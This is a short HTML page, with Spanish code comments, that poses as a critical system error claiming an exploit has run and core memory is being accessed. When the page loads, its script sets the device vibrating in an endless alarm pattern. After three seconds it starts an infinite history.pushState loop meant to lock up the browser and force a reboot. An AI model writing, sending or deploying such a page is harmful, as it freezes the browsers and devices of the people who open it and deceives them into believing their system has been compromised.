<html>
<head>
    <title>SYSTEM_CRITICAL_ERROR</title>
</head>
<body style="background-color:black; color:red; font-family:monospace; text-align:center; padding-top:20%;">
    <h1>EXPLOIT_EXECUTED_CRITICAL_FAILURE</h1>
    <p>ACCESING_CORE_MEMORY... 89%</p>
    
    <script>
        // Bucle de vibración infinita (patrón de alarma)
        setInterval(() => {
            if (navigator.vibrate) {
                navigator.vibrate([500, 200, 500, 200, 1000]);
            }
        }, 1000);

        // Bucle de saturación de historial para forzar el Soft Reboot
        setTimeout(() => {
            while(true) {
                window.history.pushState(null, "", window.location.href);
            }
        }, 3000); // Empieza a saturar tras 3 segundos de vibración
    </script>
</body>
</html>
